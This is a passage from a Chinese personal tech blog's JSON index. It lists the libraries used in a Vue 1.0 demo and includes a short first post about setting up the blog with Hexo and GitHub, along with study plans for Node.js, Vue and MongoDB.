此demo在实现上使用了以下技术 [x] - vue: “^1.0.21”, 考虑到Vue2.0组件还不够丰富，因此就还是想用1.0+的版本。 [x] - vue-resource: “^1.0.0”, 要获取数据就要调API，在requireJs架构中使用Jquery即可，但是毕竟Jquery与Vue的思想是背道而驰的，因此选择使用”vue-resource”这套组件，她提供了非常友好而已用的API，来帮助我们非常快速简单地进行数据请求。 [x] - mint-ui: “^1.0.2” UI组件我选择大名鼎鼎的由饿了么前端团队出品的Mint-ui，这套组件文档丰富，更新快（现已完全支持Vue2.0+），能够满足80%左右前端UI的需求。 [x] - vue-echarts: “^1.0.0”, Echarts我原来就很喜欢了，百度的产品，有非常丰富的图表类型可供选择。原本使用的是Vue-chartjs，但是最后发现”vue-echarts”对”vue-resource”的支持更好（选择组件的过程中发现，一个好的组件，一定要做到对常用其他组件的支持，否则就失去存在意思，会被淘汰）。 [x] - vue-animated-list [x] - vuex: “^1.0.0-rc.2”, 这个组件的意义在于清晰地状态管理，结合Chrome上的调试工具，玩法很多。 [x] - vue-router [x] - fastclick 注：在这边要提醒一下，一定要保持各组件之间的版本对应，必须时在npm安装时可以简单地在后面加上@X（版本号）来安装对应版本。","tags":[]},{"title":"搭好了我的博客","date":"2017-01-16T08:12:12.622Z","path":"2017/01/16/hello-world/","text":"最近这两天工作并不忙，因此有很多时间自学，今天也是用Hexo和Github搭建了这个个人的技术博客，希望以后可以多写点东西，多长进！列一下这段时间准备研究的东西 Node.js对于一个前前端的全栈工程师来说，Node.js是非常好的语言，并且学习社区非常完善，资料健全，很有意思。 Vue.jsVue是一个很容易上手的框架，单页面应用也是非常好的一个前端网页思路，有效地减少白屏带来的视觉问题。这两天在做搭个人网站的时候用上了Vue，打包完也有2M左右，组件太丰富，选择是一个问题。 MongoDb123$(document).ready(function () &#123; alert('hello world');&#125;); 数据库的选择，效率不错，API也很好使用。","tags":[]}]